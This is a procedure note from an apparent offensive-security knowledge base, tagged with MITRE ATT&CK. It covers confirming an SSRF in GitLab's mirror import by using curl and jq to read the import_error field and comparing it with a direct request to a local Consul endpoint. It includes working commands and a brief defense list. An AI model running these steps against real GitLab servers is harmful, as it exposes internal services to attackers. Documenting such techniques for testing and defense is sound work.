---
id: proc-uuid-006
tags:
  - ssrf
  - leak
  - import-error
type: procedure
tools:
  - '[[tools/jq]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-check-import-error]]'
  - '[[commands/curl-local-consul]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T03:53:38.538Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Check-Import-Status-for-SSRF-Result

## Summary

This procedure queries the GitLab project API to extract the import_error, revealing SSRF results like internal status codes and bodies from the proxied request.

## Description

After triggering the mirror, the failed clone populates import_error with the internal service's response (e.g., Consul's 405). Use jq to parse JSON. Compare with direct curl to confirm leakage.

## Requirements

1. Project ID (e.g., 204)
2. GitLab API token
3. jq installed for JSON parsing

## Defense

Defensive measures and detection strategies:

- Sanitize error messages to avoid leaking internal details
- Rate-limit API queries for project status
- Log error exposures for review

## Objectives

1. Retrieve import_error from API
2. Parse and analyze for leaked internal data
3. Validate against direct internal access

## Instructions

### Step 1: Query Project Status

**Context**: GET project details and extract error field showing SSRF outcome.

**Command** ([[commands/curl-check-import-error]]):
```bash
curl -H "Authorization: Bearer $TOKEN" -v 'http://gitlab-vm.local/api/v4/projects/204' | jq .import_error
```

> Expected output: "Fetching remote upstream failed: remote: method GET not allowed\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\n".

### Step 2: Compare with Direct Internal Curl

**Context**: Simulate the SSRF hit directly to match leaked body.

**Command** ([[commands/curl-local-consul]]):
```bash
curl -v localhost:8500/v1/config
```

> Expected output: HTTP/1.1 405 with 'method GET not allowed'.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Local System]]

### Sub-Techniques


## Commands Used

- [[commands/curl-check-import-error]]
- [[commands/curl-local-consul]]

## Tools Used

- [[tools/jq]]

## Tags

- ssrf
- leak
